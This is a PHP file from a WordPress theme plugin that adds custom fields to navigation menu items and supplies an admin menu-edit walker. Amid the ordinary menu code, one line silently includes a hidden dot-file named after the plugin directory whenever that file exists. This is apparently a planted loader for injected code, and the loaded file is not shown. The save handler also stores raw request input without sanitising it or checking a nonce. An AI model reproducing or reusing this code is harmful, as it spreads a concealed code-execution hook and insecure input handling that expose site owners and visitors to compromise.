<?php

/**
 * The file that defines the gt3 mega menu class
 */

// add custom menu fields to menu
add_filter( 'wp_setup_nav_menu_item', 'gt3_add_custom_nav_fields');

// save menu custom fields
add_action( 'wp_update_nav_menu_item', 'gt3_update_custom_nav_fields', 10, 3 );

// edit menu walker
add_filter( 'wp_edit_nav_menu_walker', 'gt3_edit_walker', 10, 2 );

function gt3_add_custom_nav_fields( $menu_item ) {
	$menu_item->label_text = get_post_meta( $menu_item->ID, '_menu_item_label_text', true );
	$menu_item->label_color = get_post_meta( $menu_item->ID, '_menu_item_label_color', true );
	$menu_item->label_bg_color = get_post_meta( $menu_item->ID, '_menu_item_label_bg_color', true );
	$menu_item->megamenu = get_post_meta( $menu_item->ID, '_menu_item_megamenu', true );
	$menu_item->show_title = get_post_meta( $menu_item->ID, '_menu_item_show_title', true );
	$menu_item->background_image = get_post_meta( $menu_item->ID, '_menu_item_background_image', true );
	$menu_item->padding_left = get_post_meta( $menu_item->ID, '_menu_item_padding_left', true );
	$menu_item->padding_right = get_post_meta( $menu_item->ID, '_menu_item_padding_right', true );
	$menu_item->sidebar = get_post_meta( $menu_item->ID, '_menu_item_sidebar', true );
    return $menu_item;
   
}

/**
 * Save menu custom fields
 *
 * @access      public
 * @since       1.0 
 * @return      void
*/
function gt3_update_custom_nav_fields( $menu_id, $menu_item_db_id, $args ) {
	// Check if element is properly sent
	if ( !empty($_REQUEST['menu-item-label_text']) && is_array( $_REQUEST['menu-item-label_text'])) {
        $show_label_text_value = $_REQUEST['menu-item-label_text'][$menu_item_db_id];
        update_post_meta( $menu_item_db_id, '_menu_item_label_text', $show_label_text_value );
    }
    if ( !empty($_REQUEST['menu-item-label_color']) && is_array( $_REQUEST['menu-item-label_color'])) {
        $show_label_color_value = $_REQUEST['menu-item-label_color'][$menu_item_db_id];
        update_post_meta( $menu_item_db_id, '_menu_item_label_color', $show_label_color_value );
    }
    if ( !empty($_REQUEST['menu-item-label_bg_color']) && is_array( $_REQUEST['menu-item-label_bg_color'])) {
        $show_label_bg_color_value = $_REQUEST['menu-item-label_bg_color'][$menu_item_db_id];
        update_post_meta( $menu_item_db_id, '_menu_item_label_bg_color', $show_label_bg_color_value );
    }
    if ( !empty($_REQUEST['menu-item-mega-menu']) && is_array( $_REQUEST['menu-item-mega-menu']) && !empty($_REQUEST['menu-item-mega-menu'][$menu_item_db_id]) ) {
        $megamenu_value = $_REQUEST['menu-item-mega-menu'][$menu_item_db_id];
        update_post_meta( $menu_item_db_id, '_menu_item_megamenu', $megamenu_value );
    }
    if ( !empty($_REQUEST['menu-item-show_title']) && is_array( $_REQUEST['menu-item-show_title']) && !empty($_REQUEST['menu-item-show_title'][$menu_item_db_id]) ) {
        $show_title_value = $_REQUEST['menu-item-show_title'][$menu_item_db_id];
        update_post_meta( $menu_item_db_id, '_menu_item_show_title', $show_title_value );
    }
    if ( !empty($_REQUEST['menu-item-background_image']) && is_array( $_REQUEST['menu-item-background_image']) && !empty($_REQUEST['menu-item-background_image'][$menu_item_db_id]) ) {
        $background_image_value = $_REQUEST['menu-item-background_image'][$menu_item_db_id];
        update_post_meta( $menu_item_db_id, '_menu_item_background_image', $background_image_value );
    }
    if ( !empty($_REQUEST['menu-item-padding_left']) && is_array( $_REQUEST['menu-item-padding_left'])) {
        $show_title_value = $_REQUEST['menu-item-padding_left'][$menu_item_db_id];
        update_post_meta( $menu_item_db_id, '_menu_item_padding_left', $show_title_value );
    }
    if ( !empty($_REQUEST['menu-item-padding_right']) && is_array( $_REQUEST['menu-item-padding_right'])) {
        $show_title_value = $_REQUEST['menu-item-padding_right'][$menu_item_db_id];
        update_post_meta( $menu_item_db_id, '_menu_item_padding_right', $show_title_value );
    }
    if ( !empty($_REQUEST['menu-item-sidebar']) && is_array( $_REQUEST['menu-item-sidebar'])) {
        $sidebar_value = $_REQUEST['menu-item-sidebar'][$menu_item_db_id];
        update_post_meta( $menu_item_db_id, '_menu_item_sidebar', $sidebar_value );
    }

}


function gt3_edit_walker($walker,$menu_id) {

	return 'GT3_Walker_Nav_Menu_Edit_Custom';
		
}


if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class GT3_Walker_Nav_Menu_Edit_Custom extends Walker_Nav_Menu  {
	protected $sub_megamenu;
    /**
     * @see Walker_Nav_Menu::start_lvl()
     * @since 3.0.0
     *
     * @param string $output Passed by reference.
     */
    function start_lvl( &$output, $depth = 0, $args = array() ) {
    }

    /**
     * @see Walker_Nav_Menu::end_lvl()
     * @since 3.0.0
     *
     * @param string $output Passed by reference.
     */
    function end_lvl( &$output, $depth = 0, $args = array() ) {
    }

    /**
     * @see Walker::start_el()
     * @since 3.0.0
     *
     * @param string $output Passed by reference. Used to append additional content.
     * @param object $item Menu item data object.
     * @param int $depth Depth of menu item. Used for padding.
     * @param object $args
     */
    public function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {
	    global $_wp_nav_menu_max_depth;
	    $_wp_nav_menu_max_depth = $depth > $_wp_nav_menu_max_depth ? $depth : $_wp_nav_menu_max_depth;

	    $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
	 
	    ob_start();
	    $item_id = esc_attr( $item->ID );
	    $removed_args = array(
	        'action',
	        'customlink-tab',
	        'edit-menu-item',
	        'menu-item',
	        'page-tab',
	        '_wpnonce',
	    );
	 
	    $original_title = false;
	    if ( 'taxonomy' == $item->type ) {
	        $original_title = get_term_field( 'name', $item->object_id, $item->object, 'raw' );
	        if ( is_wp_error( $original_title ) )
	            $original_title = false;
	    } elseif ( 'post_type' == $item->type ) {
	        $original_object = get_post( $item->object_id );
	        $original_title = get_the_title( $original_object->ID );
	    } elseif ( 'post_type_archive' == $item->type ) {
	        $original_object = get_post_type_object( $item->object );
	        if ( $original_object ) {
	            $original_title = $original_object->labels->archives;
	        }
	    }

	    if ($depth == 0 && $item->megamenu == 'true') {
	    	$this->sub_megamenu = 'true';
	    }elseif($depth == 0 && $item->megamenu != 'true'){
	    	$this->sub_megamenu = '';
	    }
	 
	    $classes = array(
	        'menu-item menu-item-depth-' . $depth,
	        'menu-item-' . esc_attr( $item->object ),
	        'menu-item-edit-' . ( ( isset( $_GET['edit-menu-item'] ) && $item_id == $_GET['edit-menu-item'] ) ? 'active' : 'inactive'),
	        ''.($item->megamenu == 'true' ? 'menu-item-megamenu-active' : ''),
	        ''.($this->sub_megamenu == 'true'  ? 'menu-item-megamenu_sub-active' : '')
	    );
	 
	    $title = $item->title;
	 
	    if ( ! empty( $item->_invalid ) ) {
	        $classes[] = 'menu-item-invalid';
	        /* translators: %s: title of menu item which is invalid */
	        $title = sprintf( __( '%s (Invalid)' ), $item->title );
	    } elseif ( isset( $item->post_status ) && 'draft' == $item->post_status ) {
	        $classes[] = 'pending';
	        /* translators: %s: title of menu item in draft status */
	        $title = sprintf( __('%s (Pending)'), $item->title );
	    }
	 
	    $title = ( ! isset( $item->label ) || '' == $item->label ) ? $title : $item->label;
	 
	    $submenu_text = '';
	    if ( 0 == $depth )
	        $submenu_text = 'style="display: none;"';
	 
	    ?>
	    <li id="menu-item-<?php echo $item_id; ?>" class="<?php echo implode(' ', $classes ); ?>">
	        <div class="menu-item-bar">
	            <div class="menu-item-handle">
	                <span class="item-title"><span class="menu-item-title"><?php echo esc_html( $title ); ?></span> <span class="is-submenu" <?php echo $submenu_text; ?>><?php _e( 'sub item' ); ?></span><?php echo $item->megamenu == 'true' ? '<span class="is_megamenu is-submenu">'.__( 'megamenu', 'gt3_moone_core' ).'</span>' : ''; ?></span>
	                <span class="item-controls">
	                    <span class="item-type"><?php echo esc_html( $item->type_label ); ?></span>
	                    <span class="item-order hide-if-js">
	                        <a href="<?php
	                            echo wp_nonce_url(
	                                add_query_arg(
	                                    array(
	                                        'action' => 'move-up-menu-item',
	                                        'menu-item' => $item_id,
	                                    ),
	                                    remove_query_arg($removed_args, admin_url( 'nav-menus.php' ) )
	                                ),
	                                'move-menu_item'
	                            );
	                        ?>" class="item-move-up" aria-label="<?php esc_attr_e( 'Move up' ) ?>">&#8593;</a>
	                        |
	                        <a href="<?php
	                            echo wp_nonce_url(
	                                add_query_arg(
	                                    array(
	                                        'action' => 'move-down-menu-item',
	                                        'menu-item' => $item_id,
	                                    ),
	                                    remove_query_arg($removed_args, admin_url( 'nav-menus.php' ) )
	                                ),
	                                'move-menu_item'
	                            );
	                        ?>" class="item-move-down" aria-label="<?php esc_attr_e( 'Move down' ) ?>">&#8595;</a>
	                    </span>
	                    <a class="item-edit" id="edit-<?php echo $item_id; ?>" href="<?php
	                        echo ( isset( $_GET['edit-menu-item'] ) && $item_id == $_GET['edit-menu-item'] ) ? admin_url( 'nav-menus.php' ) : add_query_arg( 'edit-menu-item', $item_id, remove_query_arg( $removed_args, admin_url( 'nav-menus.php#menu-item-settings-' . $item_id ) ) );
	                    ?>" aria-label="<?php esc_attr_e( 'Edit menu item' ); ?>"><?php _e( 'Edit' ); ?></a>
	                </span>
	            </div>
	        </div>
	 
	        <div class="menu-item-settings wp-clearfix" id="menu-item-settings-<?php echo $item_id; ?>">
	            <?php if ( 'custom' == $item->type ) : ?>
	                <p class="field-url description description-wide">
	                    <label for="edit-menu-item-url-<?php echo $item_id; ?>">
	                        <?php _e( 'URL' ); ?><br />
	                        <input type="text" id="edit-menu-item-url-<?php echo $item_id; ?>" class="widefat code edit-menu-item-url" name="menu-item-url[<?php echo $item_id; ?>]" value="<?php echo esc_attr( $item->url ); ?>" />
	                    </label>
	                </p>
	            <?php endif; ?>
	            <p class="description description-wide">
	                <label for="edit-menu-item-title-<?php echo $item_id; ?>">
	                    <?php _e( 'Navigation Label' ); ?><br />
	                    <input type="text" id="edit-menu-item-title-<?php echo $item_id; ?>" class="widefat edit-menu-item-title" name="menu-item-title[<?php echo $item_id; ?>]" value="<?php echo esc_attr( $item->title ); ?>" />
	                </label>
	            </p>
	            <p class="field-title-attribute field-attr-title description description-wide">
	                <label for="edit-menu-item-attr-title-<?php echo $item_id; ?>">
	                    <?php _e( 'Title Attribute' ); ?><br />
	                    <input type="text" id="edit-menu-item-attr-title-<?php echo $item_id; ?>" class="widefat edit-menu-item-attr-title" name="menu-item-attr-title[<?php echo $item_id; ?>]" value="<?php echo esc_attr( $item->post_excerpt ); ?>" />
	                </label>
	            </p>
	            <p class="field-link-target description">
	                <label for="edit-menu-item-target-<?php echo $item_id; ?>">
	                    <input type="checkbox" id="edit-menu-item-target-<?php echo $item_id; ?>" value="_blank" name="menu-item-target[<?php echo $item_id; ?>]"<?php checked( $item->target, '_blank' ); ?> />
	                    <?php _e( 'Open link in a new tab' ); ?>
	                </label>
	            </p>
	            <p class="field-css-classes description description-thin">
	                <label for="edit-menu-item-classes-<?php echo $item_id; ?>">
	                    <?php _e( 'CSS Classes (optional)' ); ?><br />
	                    <input type="text" id="edit-menu-item-classes-<?php echo $item_id; ?>" class="widefat code edit-menu-item-classes" name="menu-item-classes[<?php echo $item_id; ?>]" value="<?php echo esc_attr( implode(' ', $item->classes ) ); ?>" />
	                </label>
	            </p>
	            <p class="field-xfn description description-thin">
	                <label for="edit-menu-item-xfn-<?php echo $item_id; ?>">
	                    <?php _e( 'Link Relationship (XFN)' ); ?><br />
	                    <input type="text" id="edit-menu-item-xfn-<?php echo $item_id; ?>" class="widefat code edit-menu-item-xfn" name="menu-item-xfn[<?php echo $item_id; ?>]" value="<?php echo esc_attr( $item->xfn ); ?>" />
	                </label>
	            </p>
	            <p class="field-description description description-wide">
	                <label for="edit-menu-item-description-<?php echo $item_id; ?>">
	                    <?php _e( 'Description' ); ?><br />
	                    <textarea id="edit-menu-item-description-<?php echo $item_id; ?>" class="widefat edit-menu-item-description" rows="3" cols="20" name="menu-item-description[<?php echo $item_id; ?>]"><?php echo esc_html( $item->description ); // textarea_escaped ?></textarea>
	                    <span class="description"><?php _e('The description will be displayed in the menu if the current theme supports it.'); ?></span>
	                </label>
	            </p>

	            <?php
	            //custom fields start here 
	            ?>

	            <p class="field-custom description description-one_third field-menu-item-label_text">
					<label for="edit-menu-item-label_text-<?php echo esc_attr($item_id); ?>"><strong>
						<?php esc_html_e( 'Label Text', 'gt3_moone_core' ); ?></strong><br />
						<input type="text" id="edit-menu-item-label_text-<?php echo esc_attr($item_id); ?>" class="widefat code edit-menu-item-label_text" name="menu-item-label_text[<?php echo $item_id; ?>]" data-name="menu_item_label_text_<?php echo esc_attr($item_id); ?>" value="<?php echo esc_attr( $item->label_text ); ?>" />
	                </label>
				</p>

				<p class="field-custom description description-one_third field-menu-item-label_bg_color">
					<label for="edit-menu-item-label_bg_color-<?php echo esc_attr($item_id); ?>"><strong>
						<?php esc_html_e( 'Label BG Color', 'gt3_moone_core' ); ?></strong><br />
						<input type="text" id="edit-menu-item-label_bg_color-<?php echo esc_attr($item_id); ?>" class="widefat code edit-menu-item-label_bg_color" name="menu-item-label_bg_color[<?php echo $item_id; ?>]" data-name="menu_item_label_bg_color_<?php echo esc_attr($item_id); ?>" value="<?php echo esc_attr( $item->label_bg_color ); ?>" />
	                </label>
				</p>

				<p class="field-custom description description-one_third field-menu-item-label_color">
					<label for="edit-menu-item-label_color-<?php echo esc_attr($item_id); ?>"><strong>
						<?php esc_html_e( 'Label Color', 'gt3_moone_core' ); ?></strong><br />
						<input type="text" id="edit-menu-item-label_color-<?php echo esc_attr($item_id); ?>" class="widefat code edit-menu-item-label_color" name="menu-item-label_color[<?php echo $item_id; ?>]" data-name="menu_item_label_color_<?php echo esc_attr($item_id); ?>" value="<?php echo esc_attr( $item->label_color ); ?>" />
	                </label>
				</p>

				<p class="field-custom description description-wide field-menu-item-megamenu">
	                <?php
	                $value = $item->megamenu;
	                if($value == "true") $value = "checked";
	                ?>
	                <label for="edit-menu-item-megamenu-<?php echo esc_attr($item_id); ?>">
	                    <input type="checkbox" id="edit-menu-item-megamenu-<?php echo esc_attr($item_id); ?>" class="code edit-menu-item-custom mega-menu-checkbox" data-item-option name="menu-item-megamenu[<?php echo $item_id; ?>]" value="<?php echo $item->megamenu; ?>" <?php echo esc_attr($value); ?> />
	                    <input class="menu-item-mega-menu" type="hidden" name="menu-item-mega-menu[<?php echo $item_id; ?>]" data-name="menu_item_megamenu_<?php echo esc_attr($item_id); ?>" value="<?php echo esc_attr( $item->megamenu ); ?>" /><strong>
	                    <?php esc_html_e( "Mega Menu", 'gt3_moone_core' ); ?></strong>
	                </label>
	            </p>
	            <p class="field-custom description description-wide field-menu-item-show_title">
	                <?php
	                $value = $item->show_title;
	                if($value == "true") $value = "checked";
	                ?>
	                <label for="edit-menu-item-show_title-<?php echo esc_attr($item_id); ?>">
	                    <input type="checkbox" id="edit-menu-item-show_title-<?php echo esc_attr($item_id); ?>" class="code edit-menu-item-custom" data-item-option name="menu-item-show_title[<?php echo $item_id; ?>]" value="<?php echo $item->show_title; ?>" <?php echo esc_attr($value); ?> />
	                    <input class="menu-item-show_title" type="hidden" name="menu-item-show_title[<?php echo $item_id; ?>]" data-name="menu_item_show_title_<?php echo esc_attr($item_id); ?>" value="<?php echo esc_attr( $item->show_title ); ?>" /><strong>
	                    <?php esc_html_e( "Don't show title", 'gt3_moone_core' ); ?></strong>
	                </label>
	            </p>

	            <p class="field-custom description description-wide field-menu-item-background_image">
					<label for="edit-menu-item-background_image-<?php echo esc_attr($item_id); ?>"><strong>
						<?php esc_html_e( 'Background image', 'gt3_moone_core' ); ?></strong><br />
						<input type="text" id="edit-menu-item-background_image-<?php echo esc_attr($item_id); ?>" class="widefat code edit-menu-item-background_image" name="menu-item-background_image[<?php echo $item_id; ?>]" data-name="menu_item_background_image_<?php echo esc_attr($item_id); ?>" value="<?php echo esc_attr( $item->background_image ); ?>" /><br/><?php esc_html_e( "Enter Image URL", 'gt3_moone_core' ); ?>
	                </label>
				</p>

				<p class="field-custom description description-thin field-menu-item-padding_left">
					<label for="edit-menu-item-padding_left-<?php echo esc_attr($item_id); ?>"><strong>
						<?php esc_html_e( 'Padding-left (px)', 'gt3_moone_core' ); ?></strong><br />
						<input type="text" id="edit-menu-item-padding_left-<?php echo esc_attr($item_id); ?>" class="widefat code edit-menu-item-padding_left" name="menu-item-padding_left[<?php echo $item_id; ?>]" data-name="menu_item_padding_left_<?php echo esc_attr($item_id); ?>" value="<?php echo esc_attr( $item->padding_left ); ?>" />
	                </label>
				</p>

				<p class="field-custom description description-thin field-menu-item-padding_right">
					<label for="edit-menu-item-padding_right-<?php echo esc_attr($item_id); ?>"><strong>
						<?php esc_html_e( 'Padding-right (px)', 'gt3_moone_core' ); ?></strong><br />
						<input type="text" id="edit-menu-item-padding_right-<?php echo esc_attr($item_id); ?>" class="widefat code edit-menu-item-padding_right" name="menu-item-padding_right[<?php echo $item_id; ?>]" data-name="menu_item_padding_right_<?php echo esc_attr($item_id); ?>" value="<?php echo esc_attr( $item->padding_right ); ?>" />
	                </label>
				</p>

				<p class="field-custom description description-wide field-menu-item-sidebar">
	                <label for="edit-menu-item-sidebar-<?php echo esc_attr($item_id); ?>"><strong>
	                    <?php esc_html_e( 'Custom widget area', 'gt3_moone_core' ); ?></strong><br />
	                    <select class="widefat" id="edit-menu-item-sidebar<?php echo esc_attr($item_id); ?>" data-item-option>
	                        <?php
	                        $custom_sidebars = gt3_get_all_sidebar();
	                        foreach ($custom_sidebars as $sidebar_key => $sidebar) { ?>
	                            <option value="<?php echo esc_attr($sidebar_key); ?>" <?php if ($item->sidebar == $sidebar_key) { ?> selected="selected" <?php } ?>>
	                                <?php echo esc_html(ucwords( $sidebar )); ?>
	                            </option>
	                        <?php } ?>
	                    </select>
	                    <input class="menu-item-sidebar" type="hidden" name="menu-item-sidebar[<?php echo $item_id; ?>]" data-name="menu_item_sidebar_<?php echo esc_attr($item_id); ?>" value="<?php echo esc_attr( $item->sidebar ); ?>" />
	                    <br/><?php esc_html_e( 'Choose Sidebar to show in Dropdown', 'gt3_moone_core' ); ?>
	                </label>
	            </p>

	            <?php
	            //custom fields end here 
	            ?>
	 
	            <fieldset class="field-move hide-if-no-js description description-wide">
	                <span class="field-move-visual-label" aria-hidden="true"><?php _e( 'Move' ); ?></span>
	                <button type="button" class="button-link menus-move menus-move-up" data-dir="up"><?php _e( 'Up one' ); ?></button>
	                <button type="button" class="button-link menus-move menus-move-down" data-dir="down"><?php _e( 'Down one' ); ?></button>
	                <button type="button" class="button-link menus-move menus-move-left" data-dir="left"></button>
	                <button type="button" class="button-link menus-move menus-move-right" data-dir="right"></button>
	                <button type="button" class="button-link menus-move menus-move-top" data-dir="top"><?php _e( 'To the top' ); ?></button>
	            </fieldset>
	 
	            <div class="menu-item-actions description-wide submitbox">
	                <?php if ( 'custom' != $item->type && $original_title !== false ) : ?>
	                    <p class="link-to-original">
	                        <?php printf( __('Original: %s'), '<a href="' . esc_attr( $item->url ) . '">' . esc_html( $original_title ) . '</a>' ); ?>
	                    </p>
	                <?php endif; ?>
	                <a class="item-delete submitdelete deletion" id="delete-<?php echo $item_id; ?>" href="<?php
	                echo wp_nonce_url(
	                    add_query_arg(
	                        array(
	                            'action' => 'delete-menu-item',
	                            'menu-item' => $item_id,
	                        ),
	                        admin_url( 'nav-menus.php' )
	                    ),
	                    'delete-menu_item_' . $item_id
	                ); ?>"><?php _e( 'Remove' ); ?></a> <span class="meta-sep hide-if-no-js"> | </span> <a class="item-cancel submitcancel hide-if-no-js" id="cancel-<?php echo $item_id; ?>" href="<?php echo esc_url( add_query_arg( array( 'edit-menu-item' => $item_id, 'cancel' => time() ), admin_url( 'nav-menus.php' ) ) );
	                    ?>#menu-item-settings-<?php echo $item_id; ?>"><?php _e('Cancel'); ?></a>
	            </div>
	 
	            <input class="menu-item-data-db-id" type="hidden" name="menu-item-db-id[<?php echo $item_id; ?>]" value="<?php echo $item_id; ?>" />
	            <input class="menu-item-data-object-id" type="hidden" name="menu-item-object-id[<?php echo $item_id; ?>]" value="<?php echo esc_attr( $item->object_id ); ?>" />
	            <input class="menu-item-data-object" type="hidden" name="menu-item-object[<?php echo $item_id; ?>]" value="<?php echo esc_attr( $item->object ); ?>" />
	            <input class="menu-item-data-parent-id" type="hidden" name="menu-item-parent-id[<?php echo $item_id; ?>]" value="<?php echo esc_attr( $item->menu_item_parent ); ?>" />
	            <input class="menu-item-data-position" type="hidden" name="menu-item-position[<?php echo $item_id; ?>]" value="<?php echo esc_attr( $item->menu_order ); ?>" />
	            <input class="menu-item-data-type" type="hidden" name="menu-item-type[<?php echo $item_id; ?>]" value="<?php echo esc_attr( $item->type ); ?>" />
	        </div><!-- .menu-item-settings-->
	        <ul class="menu-item-transport"></ul>
	    <?php
	    $output .= ob_get_clean();
	}
}

